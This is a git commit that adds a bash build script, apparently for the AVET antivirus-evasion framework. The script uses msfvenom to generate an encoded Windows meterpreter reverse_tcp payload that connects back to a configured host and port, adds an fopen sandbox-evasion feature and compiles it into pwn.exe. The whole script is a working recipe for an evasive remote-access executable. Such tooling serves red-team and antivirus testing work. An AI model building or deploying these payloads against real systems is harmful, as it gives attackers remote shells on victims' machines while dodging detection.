432e82300074f46adc89f942c4395c42efb7b1dc
Florian Saager <florian.saager@rub.de>
2018-10-01 14:05:24 +0200

    Added new build script for testing purposes

---
+++ build/build_test.sh
@@ -0,0 +1,37 @@
+#!/bin/bash      
+# example build script
+
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+
+# generate payload and call avet
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+
+# keep make_avet to at least get the shellcode input
+./make_avet -f sc.txt
+
+# import feature construction interface
+. build/feature_construction.sh
+
+# add fopen sandbox evasion feature
+add_feature fopen_sandbox_evasion
+
+# add gethostbyname killswitch evasion feature
+#append_value KVALUE localhost
+#add_feature gethostbyname_sandbox_evasion
+
+# compile
+$win32_compiler -o pwn.exe avet.c
+
+# cleanup
+rm sc.txt && echo "" > defs.h
+cleanup_techniques
